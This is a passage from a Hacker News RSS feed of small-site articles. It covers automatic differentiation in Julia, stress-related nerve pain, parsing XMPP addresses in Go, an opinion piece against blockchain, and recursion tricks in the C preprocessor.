<div><div><pre><code><span>function</span><span> my_sin</span><span>(</span><span>x</span><span>::</span><span>Dual</span><span>)</span>
    <span>return</span> <span>Dual</span><span>(</span><span>my_sin</span><span>(</span><span>primal</span><span>(</span><span>x</span><span>)),</span> <span>partial</span><span>(</span><span>x</span><span>)</span> <span>*</span> <span>my_cos</span><span>(</span><span>primal</span><span>(</span><span>x</span><span>)))</span>
<span>end</span>
</code></pre></div></div>
<p>and it does indeed fix it.</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.5000000000217777</span>

<span>julia</span><span>&gt;</span> <span>abs</span><span>(</span><span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span> <span>-</span> <span>0.5</span><span>)</span>
<span>2.177769076183722e-11</span>
</code></pre></div></div>

<h3 id="bonus-will-symbolic-differentiation-save-me">Bonus: will symbolic differentiation save me?</h3>

<p>Most symbolic differentiation systems will have a rule just like the custom primitive for <code>sin</code> built in.
It basically has to do something like this, where-as a forward/reverse AD system could do as we did and fall back to <code>+</code> and <code>*</code>.
<em>But</em>, it certainly would <em>not</em> help you to apply symbolic AD to an approximation, that would give exactly the result we derived for <code>d_sin</code> above.</p>

<p>More interestingly, languages where symbolic differentiation is common tend also th have interesting representations of functions in the first place.
This does open up avenues for interesting solutions.
A suitably weird language could be using representation of <code>sin</code> that is a lazily evaluated polynomial of infinite degree underneath.
And in that case there is a rule for its derivative, expressed in terms of changes to its coefficient generating function; which would also give back a lazily evaluated polynomial.
I don’t know if anyone does that though; I suspect it doesn’t generalized well.
Further, for a lot of things you want to solving systems via iterative methods, and these …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.oxinabox.net/2021/02/08/AD-truncation-error.html">https://www.oxinabox.net/2021/02/08/AD-truncation-error.html</a></em></p>]]>
            </description>
            <link>https://www.oxinabox.net/2021/02/08/AD-truncation-error.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26068382</guid>
            <pubDate>Mon, 08 Feb 2021 18:45:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AI Turns Website into Audio as a Podcast]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26068181">thread link</a>) | @ali_wetrill
<br/>
February 8, 2021 | https://audiblogs.com/home | <a href="https://web.archive.org/web/*/https://audiblogs.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://audiblogs.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-26068181</guid>
            <pubDate>Mon, 08 Feb 2021 18:28:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I can no longer lift laundry detergent (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26068047">thread link</a>) | @mooreds
<br/>
February 8, 2021 | https://elizabethyin.com/2020/07/12/why-i-can-no-longer-lift-laundry-detergent/ | <a href="https://web.archive.org/web/*/https://elizabethyin.com/2020/07/12/why-i-can-no-longer-lift-laundry-detergent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today I’m going to talk about something that’s a little bit off the beaten path of what I normally write about.</p>



<p>Also side digression: if you like my content, please sign up for the newsletter 🙂 </p>



	<div data-blog-id="155286968">
		<div>
			
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	


<p>I want to talk about stress. I tweeted this last night:&nbsp;</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>PSA: Remember to take time to de-stress &amp; live healthily.</p><p>Like many ppl, I’m bad at this. But stress has a way of biting you. </p><p>Here is 1 weird manifestation – you get so tense, you impinge you own nerve &amp; cannot do normal things like lift a detergent bottle w your right hand: <a href="https://t.co/upjJ3AYbZl">pic.twitter.com/upjJ3AYbZl</a></p></div>— Elizabeth Yin (@dunkhippo33) <a href="https://twitter.com/dunkhippo33/status/1282144912851390464?ref_src=twsrc%5Etfw">July 12, 2020</a></blockquote>
</div></figure>



<p>This is what stress can do — I cannot lift laundry detergent “normally” with my right arm.&nbsp;</p>



<p>In fact, it turns out that your trapezius muscle allows you to do many things such as</p>



<ul><li>Reach for things in a cabinet</li><li>Adjust the rear-view mirror or radio knob in a car</li><li>Wash dishes</li><li>To a certain extent, use a fork to eat food.&nbsp;</li></ul>



<p>Without this muscle, many things are challenging. </p>



<p>One of my founders even texted me right after I posted this video if I was stressed out about his latest investor report! Hah!&nbsp;</p>



<p>This video isn’t about stress from fundraising (we’re not raising right now anyway) or from having portfolio companies who are doing well or not well.&nbsp;In fact, the reason I decided to write about this so publicly is not to garner sympathy (but thank you for all the well wishes!) but to show to everyone what can happen because of stress — <em><strong>and that this can happen to anyone</strong></em>. </p>



<p>In fact, all of this started when I was 23 — not just recently. At 23, I ended up in a hospital in Tokyo after having terrible neck pain, where I was living and working at the time. I was fortunate to have excellent care, but the bad news was that I had a pinched nerve and I would likely live with this pain and weird issues forever — though it could be <em><strong>managed with proper diet, exercise, and low stress</strong>.&nbsp;</em></p>



<p>The likely combined cause?&nbsp;Years of </p>



<ul><li>Poor posture (sitting and standing)</li><li>Poor ergonomics using computers</li><li>Using computers too much (by age 23!)</li><li>Slinging too many backpacks filled with heavy books during high school</li><li>Combined with stress</li></ul>



<p>In other words, there wasn’t any particular trauma or incident. But guess what? 80% of people I know have some permutation of the above.&nbsp;</p>



<figure><img data-attachment-id="4281" data-permalink="https://elizabethyin.com/pexels-photo-3807738/" data-orig-file="https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?fit=1880%2C1253&amp;ssl=1" data-orig-size="1880,1253" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;Photo by Andrea Piacquadio on <a href=\&quot;https:\/\/www.pexels.com\/photo\/woman-in-white-shirt-showing-frustration-3807738\/\&quot; rel=\&quot;nofollow\&quot;>Pexels.com<\/a>&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;woman in white shirt showing frustration&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pexels-photo-3807738" data-image-description="" data-medium-file="https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?fit=300%2C200&amp;ssl=1" data-large-file="https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?fit=660%2C440&amp;ssl=1" loading="lazy" width="1880" height="1253" src="https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?fit=1880%2C1253&amp;ssl=1" alt="woman in white shirt showing frustration" srcset="https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?w=1880&amp;ssl=1 1880w, https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?resize=1024%2C682&amp;ssl=1 1024w, https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?resize=1536%2C1024&amp;ssl=1 1536w, https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?resize=408%2C272&amp;ssl=1 408w, https://i0.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-3807738.jpeg?w=1320&amp;ssl=1 1320w" sizes="(max-width: 660px) 100vw, 660px"><figcaption>Photo by Andrea Piacquadio on <a href="https://www.pexels.com/photo/woman-in-white-shirt-showing-frustration-3807738/" rel="nofollow">Pexels.com</a></figcaption></figure>



<p>Over the years, I’ve been able to manage this chronic issue pretty well. I started taking up swimming, even though I was never a swimmer in school (YouTube can teach you so many things!). And, I have bought so many ergonomic keyboards over the years, that I’m sure single-handedly propping the Amazon share price up.&nbsp;</p>



<p>But every once in a while, stress creeps up and sends me back into health issues. In 2009, when I was starting my company, my arms and hands were tingling and it hurt to type. In 2011, when I was fundraising, I felt like someone was constantly poking me with pins all over. Some of the best physicians who were specialists in this area could not find anything additional wrong — miraculously when I stopped fundraising, the prickly feeling left! And fast forward to today, the combination of shelter-in-place/little kids/handling of the COVID-19 situation/police brutality/racism/and even the murder hornets are all fairly stressful! (I’m sure I’m not the only one here who thinks this)</p>



<p>As it would turn out over half of my friends who are tech entrepreneurs or recovering tech entrepreneurs have stress-induced issues. Repetitive strain issues, tingling feelings, shingles, IBS or other chronic stress-related problems, etc. It’s seemingly quite common, and while mental health is starting to be discussed, the physical ramifications of stress are rarely discussed publicly.&nbsp;</p>



<p>And once you have one of these issues, with proper care, you’ll be able to manage through it, but you’ll get flare ups from time to time as stress comes and goes. You’ll never be quite the same.&nbsp;</p>



<p>If I had to rewind the clock, what would I tell myself?</p>



<p><strong>Never use a computer or iPad in an un-ergonomic way</strong></p>



<ul><li>No laptop usage on the couch</li><li>Buy an ergonomic mouse &amp; keyboard that fits your hands (the built-in ones on the Macbook Air are way too hard)</li><li>Buy an external monitor and set it to eye-level</li><li>Set up proper typing and mousing heights</li><li>Use a tablet pen with an iPad</li></ul>



<p><strong>Do a stress-relieving exercise everyday – even for 5 min</strong>. Once we leave school and become adults — there’s no PE or fun sports forced upon you to keep you accountable. And, for some (such as myself), forcing exercise becomes challenging. But even just a few jumping jacks a day can do wonders. In fact, jumping jacks are near impossible for me to do now.&nbsp;</p>



<figure><img data-attachment-id="4283" data-permalink="https://elizabethyin.com/pexels-photo-2247179/" data-orig-file="https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?fit=1860%2C1300&amp;ssl=1" data-orig-size="1860,1300" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;Photo by The Lazy Artist Gallery on <a href=\&quot;https:\/\/www.pexels.com\/photo\/woman-doing-exercise-inside-gym-2247179\/\&quot; rel=\&quot;nofollow\&quot;>Pexels.com<\/a>&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;woman doing exercise inside gym&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pexels-photo-2247179" data-image-description="" data-medium-file="https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?fit=300%2C210&amp;ssl=1" data-large-file="https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?fit=660%2C461&amp;ssl=1" loading="lazy" width="1860" height="1300" src="https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?fit=1860%2C1300&amp;ssl=1" alt="woman doing exercise inside gym" srcset="https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?w=1860&amp;ssl=1 1860w, https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?resize=300%2C210&amp;ssl=1 300w, https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?resize=1024%2C716&amp;ssl=1 1024w, https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?resize=768%2C537&amp;ssl=1 768w, https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?resize=1536%2C1074&amp;ssl=1 1536w, https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?resize=389%2C272&amp;ssl=1 389w, https://i2.wp.com/elizabethyin.com/wp-content/uploads/2020/07/pexels-photo-2247179.jpeg?w=1320&amp;ssl=1 1320w" sizes="(max-width: 660px) 100vw, 660px"><figcaption>Photo by The Lazy Artist Gallery on <a href="https://www.pexels.com/photo/woman-doing-exercise-inside-gym-2247179/" rel="nofollow">Pexels.com</a></figcaption></figure>



<p><strong>Always lift things in an ergonomic way</strong> – not just weights but everything. In school, I used to sling a lot of books over my shoulder. (Maybe I should have studied less? My HS schoolmates who had those wheelie backpacks got it right.)&nbsp;</p>



<p><strong>Sprint when you need to but jog when you don’t</strong> – in building a startup, sometimes you need to sprint — it’s inevitable. But understanding when you need to sprint and when you can jog is the key. As <a href="https://twitter.com/MacConwell/status/1282354308097474561?s=20">Mac Conwell discusses here</a>, most people try to sprint all the time, and that’s just not sustainable.&nbsp;</p>



<p>Jog mode doesn’t mean do nothing, but jog mode means reducing really extraneous things. Standing or sitting in front of a computer for hours on end isn’t what humans were meant to do. Reducing extraneous Zoom mtgs &amp; calls, extraneous emails, etc and really focusing on health (exercise + mindfulness + stress reduction + good diet) during these times is what jog mode means. Prioritizing and only focusing on just 1 work thing for a “normal” working day is what jog mode means. </p>



<p>A lot of people wonder why not that many builders go back and build again. My hunch is that it’s this: they have some sort of chronic ailment that prevents them from being in “go-go-go mode” all the time and don’t think they can build a fast-growth company if they are not in “go-go-go mode” all the time. I think if we didn’t have “go-go-go mode” all the time as the norm expectation, we would see more multi-repeat builders. There’s this sense that if you’re not in “go-go-go mode” all the time, you’re not ambitious, but I think the right analogy is akin to marathon runners. Most people can’t run marathons everyday. You need to slow on some days and rest too. But when it counts, you need to be all out there running your race. Understanding what day is your race and what days are your training are critical, but often we don’t understand that. And if you get injured, you’ll never be the same. We have so many former athletes who are now injured who don’t want to run races again because they think they won’t win.</p>



<p>For me, with my ailments, I literally cannot type as much as I used to — I need days of typing rest. That used to frustrate me to no end. But over time, I’ve come to learn what is important to type, what emails to hold off on, and more recently, I’ve started building homegrown tools to allow me to do more with less typing.&nbsp;</p>



<p>As a parent, I actually care way less about screen time and more about ergonomics. When my 3 year old said his back hurt from looking down at the screen, I was/am really hoping he was exaggerating (hard to tell), and it would not surprise me if this upcoming generation who will grow up on more portable devices that easily allow for poor posture and ergonomics will have even more chronic problems. I think ergonomics and posture should be taught in schools as part of PE or health.&nbsp;</p>



<p>In conclusion – take care of your stress and health — you only have one shot, and once your health is gone, it’s hard to be the same again.</p>



	<div data-blog-id="155286968">
		<div>
			
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
		</div></div>]]>
            </description>
            <link>https://elizabethyin.com/2020/07/12/why-i-can-no-longer-lift-laundry-detergent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26068047</guid>
            <pubDate>Mon, 08 Feb 2021 18:17:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XMPP Addresses]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26067917">thread link</a>) | @SamWhited
<br/>
February 8, 2021 | https://blog.samwhited.com/2021/02/xmpp-addresses/ | <a href="https://web.archive.org/web/*/https://blog.samwhited.com/2021/02/xmpp-addresses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>This post is copied from an article I originally wrote for <a href="https://stackoverflow.com/documentation">Stack Overflow
Documentation</a>, a wiki-style documentation site.
As it is <a href="https://meta.stackoverflow.com/questions/354217/sunsetting-documentation">no longer available</a>, I have copied it here and modified it to work in
blog post form.</p>
<hr>
<p>XMPP addresses, more commonly known as <abbr title="Jabber Identifiers">JIDs</abbr>, are defined in <a href="https://tools.ietf.org/html/rfc7622">RFC 7622</a> and identify clients, servers,
and other entities on the XMPP network.
They look like an email address, but sometimes have an optional “resourcepart”
at the end that identifies a particular client logged in as the account
represented by the rest of the address (since XMPP may have multiple clients
connected per account).
For example, my JID with a resourcepart <code>blog</code> would be:</p>
<pre><code>sam@samwhited.com/blog
</code></pre>
<p>Unlike email where the account is the lowest level of entity that can be
addressed, individual clients on the XMPP network are globally addressable
thanks to the addition of the resourcepart.</p>
<h2 id="jid-types">JID Types</h2>
<p>JIDs are sometimes broken down into two types: the “full JID” and the “bare
JID”.
Full JIDs always have a resource part and uniquely identify an individual client
or session on the network:</p>
<ul>
<li><code>romeo@example.org/orchard</code></li>
<li><code>example.org/da863ab</code></li>
</ul>
<p>Bare JIDs <strong>never</strong> have a resourcepart and identify an account or host on the
network:</p>
<ul>
<li><code>romeo@example.org</code></li>
<li><code>example.org</code></li>
</ul>
<p>From a protocol perspective nothing can be gleaned from the lack or presence of
a resourcepart or localpart other than the fact that this is an account which
may have multiple network entities with current sessions or that it addresses a
specific entity.</p>
<h2 id="splitting-a-jid">Splitting a JID</h2>
<p>To split a JID into its component parts (the localpart, domainpart, and
resourcepart), the following algorithm should be used (where the localpart is
represented by <code>lp</code>, the resourcepart by <code>rp</code>, and the domainpart by <code>dp</code> and ∈
is used to check if the given character is included in the string):</p>
<figure><a href="https://blog.samwhited.com/img/jid_split.png">
    <img src="https://d33wubrfki0l68.cloudfront.net/f9e5d76c2f5f8206866030d825f781ec3f2b4188/365c9/img/jid_split.png" alt="JID splitting flow chart" width="500"> </a>
</figure>

<p>In textual form:</p>
<ol>
<li>If the JID does not contain a “/”, the resourcepart is the empty string.
Discard everything after and including the “/” and goto 5.</li>
<li>Otherwise split on the first slash.</li>
<li>If the part after the slash was the empty string, error.</li>
<li>Otherwise the resourcepart is the part after the slash.</li>
<li>If the remainder of the JID does not contain an “@”, the localpart is empty
and the domainpart is the remainder of the JID. Goto 9.</li>
<li>Otherwise, split on the “@”.</li>
<li>If the part before the “@” is the empty string, error.</li>
<li>Otherwise the domainpart is localpart is the part before the “@” and the
domainpart is the part after the “@”.</li>
<li>Trim any “.” suffix from the domainpart.</li>
<li>Done!</li>
</ol>
<p>Note that the localpart and resourcepart are optional and may result in empty
strings (you may have a jid that is just a domainpart).</p>
<p>And finally, let’s see an example in code form using Go:</p>
<p>In Go, the <a href="https://pkg.go.dev/mellium.im/xmpp/jid"><code>mellium.im/xmpp/jid</code></a> package implements operations on JIDs.
To Split a JID string into its component parts the <a href="https://pkg.go.dev/mellium.im/xmpp/jid#SplitString"><code>SplitString</code></a> function may
be used:</p>
<pre><code>lp, dp, rp, err := SplitString("romeo@example.net")
</code></pre><p>No validation is performed by <code>SplitString</code> and the parts are not guaranteed to
be valid.</p>
<p>To manually split a string without depending on the <code>jid</code> package, the
underlying code (with annotations from RFC 7622) looks like this:</p>
<pre><code>func SplitString(s string) (localpart, domainpart, resourcepart string, err error) {
	// RFC 7622 §3.1.  Fundamentals:
	//
	//    Implementation Note: When dividing a JID into its component parts,
	//    an implementation needs to match the separator characters '@' and
	//    '/' before applying any transformation algorithms, which might
	//    decompose certain Unicode code points to the separator characters.
	//
	// so let's do that now. First we'll parse the domainpart using the rules
	// defined in §3.2:
	//
	//    The domainpart of a JID is the portion that remains once the
	//    following parsing steps are taken:
	//
	//    1.  Remove any portion from the first '/' character to the end of the
	//        string (if there is a '/' character present).
	sep := strings.Index(s, "/")

	if sep == -1 {
		resourcepart = ""
	} else {
		// If the resource part exists, make sure it isn't empty.
		if sep == len(s)-1 {
			err = errNoResourcepart
			return
		}
		resourcepart = s[sep+1:]
		s = s[:sep]
	}

	//    2.  Remove any portion from the beginning of the string to the first
	//        '@' character (if there is an '@' character present).

	sep = strings.Index(s, "@")

	switch {
	case sep == -1:
		// There is no @ sign, and therefore no localpart.
		localpart = ""
		domainpart = s
	case sep == 0:
		// The JID starts with an @ sign (invalid empty localpart)
		err = errNoLocalpart
		return
	default:
		domainpart = s[sep+1:]
		localpart = s[:sep]
	}

	// We'll throw out any trailing dots on domainparts, since they're ignored:
	//
	//    If the domainpart includes a final character considered to be a label
	//    separator (dot) by [RFC1034], this character MUST be stripped from
	//    the domainpart before the JID of which it is a part is used for the
	//    purpose of routing an XML stanza, comparing against another JID, or
	//    constructing an XMPP URI or IRI [RFC5122].  In particular, such a
	//    character MUST be stripped before any other canonicalization steps
	//    are taken.

	domainpart = strings.TrimSuffix(domainpart, ".")

	return
}
</code></pre><h2 id="validating-a-jid">Validating a JID</h2>
<p>Unlike emails, JIDs were defined with Internationalization (i18n) in mind using
the Preparation, Enforcement, and Comparison of Internationalized Strings
(PRECIS) framework.
PRECIS is defined in <a href="https://tools.ietf.org/html/rfc8264">RFC 8264</a> and is a framework for comparing strings safely
in a variety of contexts.
For instance, imagine you have registered the nickname “Richard IV” (Latin
capital letters I, Vee) in a group chat: Using PRECIS the chat application could
ensure that no one else comes along and registers the nickname “Richard Ⅳ”
(Unicode Roman Numeral 4) and uses it to impersonate you.</p>
<p>The algorithm for validating a JID that has already been split into its
localpart, domainpart, and resourcepart is as follows:</p>
<figure><a href="https://blog.samwhited.com/img/jid_validate.png">
    <img src="https://d33wubrfki0l68.cloudfront.net/7967a0249ff5178a2ab089dfe1c38ecd9cc99b5e/c3408/img/jid_validate.png" alt="JID validation flow chart" width="500"> </a>
</figure>

<p>In textual form:</p>
<ol>
<li>Take the localpart, domainpart, and resourcepart as the inputs.</li>
<li>If the localpart or resourcepart are not valid UTF-8, error.</li>
<li>Otherwise run the IDNA “To Unicode” algorithm on the domainpart.</li>
<li>If the output domainpart is not valid UTF-8, error.</li>
<li>Otherwise run the PRECIS “Username Case Mapped” profile on the localpart, and
the “Opaque String” profile on the resource part.</li>
<li>Perform other validation steps (in no particular order).</li>
</ol>
<p>The final <code>Validations</code> step should perform the following actions (in no
particular order):</p>
<ul>
<li>Check that the localpart is less than 1024 bytes.</li>
<li>Check that the localpart does not contain any any of the following</li>
<li>characters: <code>"&amp;'/:&lt;&gt;@</code>.</li>
<li>Check that the resourcepart is less than 1024 bytes.</li>
<li>Check that the domainpart is greater than zero bytes and less than 1024</li>
<li>bytes (and possibly validate that parts of the domainpart meet hostname,</li>
<li>DNS, or IP address requirements as appropriate).</li>
<li>If the domainpart is a valid IPv6 address, ensure that it uses bracketed
notation (eg. <code>[::1]</code> instead of <code>::1</code>).</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>As a user of XMPP most of the time addresses will just look like emails and you
won’t need to ever see them except occasionally adding one to your address book.
Even as a developer of XMPP you mostly won’t need to worry about the details of
splitting or validating JIDs as robust libraries for handling XMPP addresses
exist in most or all popular programming languages.
However, sometimes it’s fun to take a bit of a dive into seemingly simple
technologies and know how they work under the hood.
Hopefully this article gave you a deeper appreciation of how to handle addresses
in XMPP.</p>

	</section></div>]]>
            </description>
            <link>https://blog.samwhited.com/2021/02/xmpp-addresses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26067917</guid>
            <pubDate>Mon, 08 Feb 2021 18:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Opinion on Blockchain]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 103 (<a href="https://news.ycombinator.com/item?id=26067770">thread link</a>) | @hoenir
<br/>
February 8, 2021 | https://vladcalin.ro/blog/2021-02-07-about-blockchain | <a href="https://web.archive.org/web/*/https://vladcalin.ro/blog/2021-02-07-about-blockchain">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>This post was inspired by a question on Reddit: How much of your investment portofolio is crypto?</p><p>Well, my answer is 0%, and it will remain 0% forever.</p><p>I don't see the value in it, and the people who advocate for them are hypocrites: they say they get into
crypto as a rebellion act against the current FIAT system that is controlled by governments, while
day-dreaming about selling it for a huge profit (in FIAT currency).
Every advocate promotes holding, which is not what a currency is for: currencies are meant to be
a medium of exchange and to change hands.</p><p>Also, I see rampant misunderstanding of basic economics in people who advocate for it:</p><ul><li><p>they say that the fact that it is deflationary and can not see inflation is a good thing, when it is
actually a bad thing. There is a reason the target inflation is at ~2% almost everywhere.
We need inflation to keep the economy going.</p></li><li><p>they say that it's a currency, when it's not. It is not accessible to everybody
(not everybody has access to internet).</p></li><li><p>if you lose your key, you lose the access to your wallet for good and nobody can help you.
People seem to not understand how bad this is. Imagine people losing everything because of one silly mistake.</p></li><li><p>Volatility is the enemy of any economy market: we need stability and predictability to avoid mayhem:
businesses need predictability to prepare their stocks, factories need predictability to produce goods,
people need predictability to budget and make long-term plans. Sure, long term plans usually don't go as planned,
but you don't want to rethink your entire strategy on a weekly basis because of some wild fluctuation (this week a
car costs 0.5BTC, next week it will be 5BTC). Because of volatility you can't even save for the future.</p></li></ul><p>Also, as a technology, blockchain itself it's not that impressive. At its core, it is a decentralized
slow read-only database which needs as lot of power to run, which do not have many real-life useful applications.
Yeah, some would argue that having a decentralized zero-trust database would be an advantage, but
I am yet to see a system using blockchain, where a normal database is not enough.</p><p>The only real-life application I could see is in audit trailing, where the decentralization part
is useless (only the chaining of blocks by hashing is useful there, to avoid tampering with past entries),
but that use-case is not related to the reason blockchain advocates promote it.</p><p>Every time some company announces that they will build their own blockchain solution, the blockchain
community celebrates, because they consider it to be proof that blockchain is the future, but in fact,
it's a massive counter-argument against the core belief they promote: decentralization.
The fact that a company is building their own, it means that they will control it.</p><h3>Conclusion</h3><p>In my opinion, Bitcoin is a fad and it's value is given by two things: people who have too much faith in an asset that
is not really an asset and has no use except offering a field for speculation, and the FOMO of people who get caught in
the heat of the moment and buy when a friend tells them to buy or mass-media brings it to the public attention
once very few months.</p><p>This article is a personal opinion, and represents no financial advice. I am in not saying "sell" or "buy".
Do your own research (thoroughly).</p></div></div></div>]]>
            </description>
            <link>https://vladcalin.ro/blog/2021-02-07-about-blockchain</link>
            <guid isPermaLink="false">hacker-news-small-sites-26067770</guid>
            <pubDate>Mon, 08 Feb 2021 17:54:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is the C preprocessor Turing complete?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26067439">thread link</a>) | @matteodelabre
<br/>
February 8, 2021 | https://pfultz2.com/blog/2012/05/10/turing/ | <a href="https://web.archive.org/web/*/https://pfultz2.com/blog/2012/05/10/turing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>One of the requirements for a language to be turing complete, is that it must be able to implement recursion. As we all know macros don’t expand recursively, but there are ways we can work around this.</p>

<p>The easiest way of doing recursion in the preprocessor is to use a deferred expression. A deferred expression is an expression that requires more scans to fully expand:</p>

<div><div><pre><code>#define EMPTY()
#define DEFER(id) id EMPTY()
#define OBSTRUCT(...) __VA_ARGS__ DEFER(EMPTY)()
#define EXPAND(...) __VA_ARGS__

#define A() 123
A() // Expands to 123
DEFER(A)() // Expands to A () because it requires one more scan to fully expand
EXPAND(DEFER(A)()) // Expands to 123, because the EXPAND macro forces another scan
</code></pre></div></div>

<p>Why is this important? Well when a macro is scanned and expanding, it creates a disabling context. This disabling context will cause a token, that refers to the currently expanding macro, to be painted blue. Thus, once its painted blue, the macro will no longer expand. This is why macros don’t expand recursively. However, a disabling context only exists during one scan, so by deferring an expansion we can prevent our macros from becoming painted blue. We will just need to apply more scans to the expression. We can do that using this <code>EVAL</code> macro:</p>

<div><div><pre><code>#define EVAL(...)  EVAL1(EVAL1(EVAL1(__VA_ARGS__)))
#define EVAL1(...) EVAL2(EVAL2(EVAL2(__VA_ARGS__)))
#define EVAL2(...) EVAL3(EVAL3(EVAL3(__VA_ARGS__)))
#define EVAL3(...) EVAL4(EVAL4(EVAL4(__VA_ARGS__)))
#define EVAL4(...) EVAL5(EVAL5(EVAL5(__VA_ARGS__)))
#define EVAL5(...) __VA_ARGS__
</code></pre></div></div>

<p>Now if we want to implement a <code>REPEAT</code> macro using recursion, first we need some increment and decrement operators to handle state:</p>

<div><div><pre><code>#define CAT(a, ...) PRIMITIVE_CAT(a, __VA_ARGS__)
#define PRIMITIVE_CAT(a, ...) a ## __VA_ARGS__

#define INC(x) PRIMITIVE_CAT(INC_, x)
#define INC_0 1
#define INC_1 2
#define INC_2 3
#define INC_3 4
#define INC_4 5
#define INC_5 6
#define INC_6 7
#define INC_7 8
#define INC_8 9
#define INC_9 9

#define DEC(x) PRIMITIVE_CAT(DEC_, x)
#define DEC_0 0
#define DEC_1 0
#define DEC_2 1
#define DEC_3 2
#define DEC_4 3
#define DEC_5 4
#define DEC_6 5
#define DEC_7 6
#define DEC_8 7
#define DEC_9 8
</code></pre></div></div>

<p>Next we need a few more macros to do logic:</p>

<div><div><pre><code>#define CHECK_N(x, n, ...) n
#define CHECK(...) CHECK_N(__VA_ARGS__, 0,)

#define NOT(x) CHECK(PRIMITIVE_CAT(NOT_, x))
#define NOT_0 ~, 1,

#define COMPL(b) PRIMITIVE_CAT(COMPL_, b)
#define COMPL_0 1
#define COMPL_1 0

#define BOOL(x) COMPL(NOT(x))

#define IIF(c) PRIMITIVE_CAT(IIF_, c)
#define IIF_0(t, ...) __VA_ARGS__
#define IIF_1(t, ...) t

#define IF(c) IIF(BOOL(c))

#define EAT(...)
